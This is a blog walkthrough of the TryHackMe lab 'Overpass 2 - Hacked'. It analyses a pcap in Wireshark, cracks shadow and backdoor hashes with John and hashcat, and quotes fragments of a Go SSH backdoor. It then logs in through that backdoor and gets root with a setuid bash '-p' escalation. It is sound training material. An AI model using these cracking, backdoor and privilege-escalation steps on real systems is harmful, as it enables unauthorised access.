---
title: "Walk-through of Overpass 2 - Hacked from TryHackMe"
header:
  teaser: /assets/images/2021-02-26-22-57-49.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Linux
  - Wireshark
  - John The Ripper
  - setuid 
---

## Machine Information

![overpass2](/assets/images/2021-02-26-22-57-49.png)

Overpass 2 is rated as an easy difficulty room on TryHackMe. The Overpass server has been hacked and we need to find our way back in to recover it! We have a pcap file, which we analyse in Wireshark to work out how the hacker got in, and what they did. Eventually we retrieve SSH credentials which we use to gain access via a backdoor left by the hacker. Then we use a simple setuid exploit to escalate ourselves to root.
<!--more-->

Skills required are a basic understanding of Wireshark. Skills learned are more in depth usage of Wirehsark, including how to use it to analyse captures.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Easy - Overpass 2](https://tryhackme.com/room/overpass2hacked) |
| Machine Release Date | 14th August 2020 |
| Date I Completed It | 26th February 2021 |
| Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |

## Task 1 - Forensics

First we need to download the pcap file so we can have a look at it in Wireshark:

![overpass2-download](/assets/images/2021-02-24-21-24-13.png)

For me I'll be using Kali which has Wireshark already installed. If you haven't used Wireshark you may want to have a look at [this](https://tryhackme.com/room/wireshark) room as an introduction to it.

Anyway, let's open the file:

![overpass2-wireshark](/assets/images/2021-02-24-21-29-57.png)

## Question 1.1

First we are asked to find the URL of the page they used to upload a reverse shell. Let's assume this was done via a web server and filter on HTTP:

![overpass2-http](/assets/images/2021-02-24-21-36-57.png)

Straight away we have reduced the noise down to just a few HTTP GET and POST entries. Now it is easy to see the URL used to upload the shell.

## Question 1.2

Next we need to find the payload used by the attacker. For this we select line number 14, which is the third one down while we have the HTTP filter on:

![overpass2-post](/assets/images/2021-02-24-21-42-21.png)

This is the POST request, or in other words we can see from this what the attacker POSTED (uploaded) to the server. We just need to right click on that line and choose Follow then HTTP Stream:

![overpass2-follow](/assets/images/2021-02-24-21-44-35.png)

This brings up a new window which shows us the reconstructed conversation between the hacker uploading the file and the server. Now we can see the content of payload.php that they uploaded:

![overpass2-payload](/assets/images/2021-02-24-21-47-32.png)

We can see the answer to question 1.2 now.

## Question 1.3

Now we are asked to find the password used by the hacker to do privilege escalation. There are several ways to find this, but possibly the easiest is to use what we've learnt about the payload that was uploaded. In there we saw that the hacker was connecting back to a server with IP 192.168.170.145 on port 4242. We can add this as a filter to see the packets:

![overpass2-destination](/assets/images/2021-02-24-22-06-22.png)

You could also remove any filters and just look down the list. You'll see line 29 is the first packet using TCP on port 4242, so it stands out quite easily:

![overpass2-nofilter](/assets/images/2021-02-24-21-58-05.png)

Either way, right click on the line and select Follow then TCP Stream:

![overpass2-followtcp](/assets/images/2021-02-24-22-10-07.png)

A new window opens showing us the full trail left by the hacker, who didn't encrypt his traffic so it's easy to see what is going on:

![overpass2-password](/assets/images/2021-02-24-22-13-26.png)

We now have the password used to escalate privileges.

## Question 1.4

On to the next question, this time we need to identify how the attacker established persistence. We can see this in the same window where we just found the password. Scroll further down to see they are cloning a repository from Github:

![overpass2-shhbackdoor](/assets/images/2021-02-24-22-19-10.png)

That was easy!

## Question 1.5

For this question we are still using the same TCP stream as we have for the last two. This time we need to take the hashes that we see from the hacker looking at the contents of /etc/shadow and try to crack them:

![overpass2-hashes](/assets/images/2021-02-24-22-25-33.png)

Copy those lines to a txt file on Kali, then use John The Ripper and the fasttrack wordlist to crack them:

```text
root@kali:/home/kali/thm/overpass2# john -wordlist=/usr/share/wordlists/fasttrack.txt hashes.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>
4g 0:00:00:00 DONE (2021-02-24 22:23) 7.407g/s 411.1p/s 2055c/s 2055C/s Spring2017..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

With that one done we've completed Task 1, so let's move on to Task 2.

## Task 2 - Research

In one of the previous questions we found the URL for the backdoor being used by the hacker. For Task 2 we are going to download that and dig in to the code to see how it works.

Let's grab the files:

```text
root@kali:/home/kali/thm/overpass2# git clone https://github.com/<HIDDEN>
Cloning into 'ssh-backdoor'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 18 (delta 4), reused 7 (delta 1), pack-reused 0
Receiving objects: 100% (18/18), 3.14 MiB | 3.40 MiB/s, done.
Resolving deltas: 100% (4/4), done.
```

## Question 2.1

The first question asks us to find the default hash used for the backdoor. Looking at the files we've downloaded, I can see this backdoor is written in Go:

```text
root@kali:/home/kali/thm/overpass2/ssh-backdoor# ls -lsa
total 6508
   4 drwxr-xr-x 3 root root    4096 Feb 24 22:31 .
   4 drwxr-xr-x 3 root root    4096 Feb 24 22:31 ..
6480 -rw-r--r-- 1 root root 6634961 Feb 24 22:31 backdoor
   4 -rw-r--r-- 1 root root     104 Feb 24 22:31 build.sh
   4 drwxr-xr-x 8 root root    4096 Feb 24 22:31 .git
   4 -rw-r--r-- 1 root root    2788 Feb 24 22:31 main.go
   4 -rw-r--r-- 1 root root     109 Feb 24 22:31 README.md
   4 -rw-r--r-- 1 root root     241 Feb 24 22:31 setup.sh
```

If you have a look at the contents of main.go it's easy to find the hash:

```text
    gossh "golang.org/x/crypto/ssh"
    "golang.org/x/crypto/ssh/terminal"
)

var hash string = "bdd04d9bb7621687f5d8 <HIDDEN> 8391d8acd01fc2170e3"

func main() {
    var (
        lport       uint   = 2222
```

## Question 2.2

The second question is just as simple, look at the end of the file for the salt:

```text
func passwordHandler(_ ssh.Context, password string) bool {
        return verifyPass(hash, "<HIDDEN>", password)
}
```

## Question 2.3

Now we need to find the hash that the hacker used.

We know by looking at main.go that the backdoor can be executed by passing it a hash when run. To find this we go back to Wireshark and have another look at the pcap file from earlier. If you repeat the steps we did for Question 1.3 and follow the TCP stream we get back to the window where we saw the hacker download the SSH backdoor.

We just need to look a little further down to see him execute the backdoor with the hash we want:

![overpas2-hackerhash](/assets/images/2021-02-25-21-50-17.png)

## Question 2.4

The final part of Task 2 is to crack the hash used by the hacker so we can use it to log on to the server.

If we go back to the main.go file we can see the hash type in there is sha512:

```text
func hashPassword(password string, salt string) string {
        hash := sha512.Sum512([]byte(password + salt))
        return fmt.Sprintf("%x", hash)
}
```

We also could have used an online analyzer like [this](https://www.tunnelsup.com/hash-analyzer/) one:

![overpass2-hashid](/assets/images/2021-02-25-22-03-54.png)

The other thing we see on the main.go file is that the hash is made up of the password and the salt we also found.

To use hashcat to crack this we'll need to find the correct mode. We can easily find that by going the the wiki [here](https://hashcat.net/wiki/doku.php?id=example_hashes) and looking it up:

![overpass2-hashcathashes](/assets/images/2021-02-25-22-08-06.png)

From that we see we need mode 1710, and the format wil need to be **pass:salt**, we can test this with the default hash and salt we found in the main.go file. Put them in a txt file like this:

```text
root@kali:/home/kali/thm/overpass2/ssh-backdoor# cat hash.txt 
bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3:1c362db832f3f864c8c2fe05f2002a05
```

Then use hashcat to crack it:

```text
root@kali:/home/kali/thm/overpass2/ssh-backdoor# hashcat -m 1710 hash.txt /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
===========================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8850H CPU @ 2.60GHz, 1428/1492 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3:1c362db832f3f864c8c2fe05f2002a05:password                            

Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512($pass.$salt)
Hash.Target......: bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23...002a05
Time.Started.....: Thu Feb 25 22:06:54 2021 (0 secs)
Time.Estimated...: Thu Feb 25 22:06:54 2021 (0 secs)
Guess.Base.......: File (/usr/share//wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   351.3 kH/s (0.65ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> lovers1

Started: Thu Feb 25 22:06:16 2021
Stopped: Thu Feb 25 22:06:56 2021
```

We see this worked and we found the password was, yep afraid so the password was password!

Now we can repeat this with the hash used by the attacker which we found in Task 2.3:

```text
root@kali:/home/kali/thm/overpass2/ssh-backdoor# hashcat -m 1710 hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
========================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8850H CPU @ 2.60GHz, 1428/1492 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share//wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:<HIDDEN>
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512($pass.$salt)
Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05
Time.Started.....: Thu Feb 25 22:12:55 2021 (0 secs)
Time.Estimated...: Thu Feb 25 22:12:55 2021 (0 secs)
Guess.Base.......: File (/usr/share//wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   927.0 kH/s (0.82ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 18432/14344385 (0.13%)
Rejected.........: 0/18432 (0.00%)
Restore.Point....: 16384/14344385 (0.11%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: christal -> tanika

Started: Thu Feb 25 22:12:49 2021
Stopped: Thu Feb 25 22:12:57 2021
```

That also worked and we have the answer to Question 2.4. We can now use the credentials we've retrieved to log in to the hacked server.

## Task 3 - Attack

It's time to deploy the machine and hack our way in to find the flags.

Once the machine is up let's run Nmap and see what we find:

```text
root@kali:/home/kali/thm/overpass2# nmap -A 10.10.27.205
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-25 22:41 GMT
Nmap scan report for 10.10.27.205
Host is up (0.023s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/25%OT=22%CT=1%CU=36133%PV=Y%DS=2%DC=T%G=Y%TM=603827D
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11
OS:NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                    
Nmap done: 1 IP address (1 host up) scanned in 51.02 seconds
```

## Question 3.1

Three ports open. Let's look at port 80 first to find what message has been left:

![overpass2-h4ck3d](/assets/images/2021-02-25-22-46-52.png)

## Question 3.2

Time to ssh on to the server. We see from the scan that there are two ports with OpenSSH listening. Let's try port 2222:

```text
root@kali:/home/kali/thm/overpass2# ssh james@10.10.27.205 -p 2222
The authenticity of host '[10.10.27.205]:2222 ([10.10.27.205]:2222)' can't be established.
RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.27.205]:2222' (RSA) to the list of known hosts.
james@10.10.27.205's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$ 
```

We're in let's find the user flag:

```text

james@overpass-production:/home/james/ssh-backdoor$ ls
README.md  backdoor.service  cooctus.png  id_rsa.pub  main.go
backdoor   build.sh          id_rsa       index.html  setup.sh
james@overpass-production:/home/james/ssh-backdoor$ cd ..
james@overpass-production:/home/james$ ls
ssh-backdoor  user.txt  www
james@overpass-production:/home/james$ cat user.txt 
<HIDDEN>
```

## Question 3.3

Before we start looking around let's see what's in our home folder. Always use the -a parameter with ls to see hidden files:

```text
james@overpass-production:/home/james$ ls -lsa
   0 lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
   4 -rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
   4 -rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
   4 drwx------ 2 james james    4096 Jul 21  2020 .cache
   4 drwx------ 3 james james    4096 Jul 21  2020 .gnupg
   4 drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
   4 -rw------- 1 james james      51 Jul 21  2020 .overpass
   4 -rw-r--r-- 1 james james     807 Apr  4  2018 .profile
   0 -rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
1088 -rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
   4 drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
   4 -rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
   4 drwxrwxr-x 7 james james    4096 Jul 21  2020 www
```

We have a binary called .suid_bash, but it has interesting permissions. In Unix we can express them in Octal or Symbolic format. For the file we've found it's permissions in Symbolic format are:

```text
-rwsr-sr-x
```

You can see it's Octal format by using the stat command:

```text
james@overpass-production:/home/james$ stat -c "%a %U:%G %n" .suid_bash 
6755 root:root .suid_bash
```

There are plenty of helpful sites to explain these permissions in detail, like [this](https://chmodcommand.com/chmod-6755) one or [this](http://www.filepermissions.com/file-permission/6755) one.

This nicely shows what 6755 looks like:

![overpass2-permissions](/assets/images/2021-02-26-22-28-44.png)

The important part is the one on the right. We see others can execute. So although the file is owned by root, we can execute it as james. And setuid is set so we can gain roots privileges.

A quick look on GFTOBins finds what we need [here](https://gtfobins.github.io/gtfobins/bash). Here we see that we can simply execute the file with a -p parameter to escalate to root:

```text
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# whoami
root
.suid_bash-4.4# cat /root/root.txt 
<HIDDEN>
```

All done. See you next time.
